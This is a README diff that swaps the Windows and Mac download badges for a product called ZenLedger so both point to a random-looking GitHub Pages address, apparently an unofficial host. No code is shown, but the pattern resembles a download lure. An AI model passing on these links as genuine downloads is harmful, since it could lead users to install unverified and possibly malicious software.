@@ -5,9 +5,9 @@
 </div>  
 <div align="center">
 
-[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://zenledger-desktop.github.io/.github)  
+[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://bearwalterspopj.github.io/.github/ZenLedger)  
 
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://asdmasldkhas231.github.io/.github)
+[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://bearwalterspopj.github.io/.github/ZenLedger)
 </div>
 
 ---
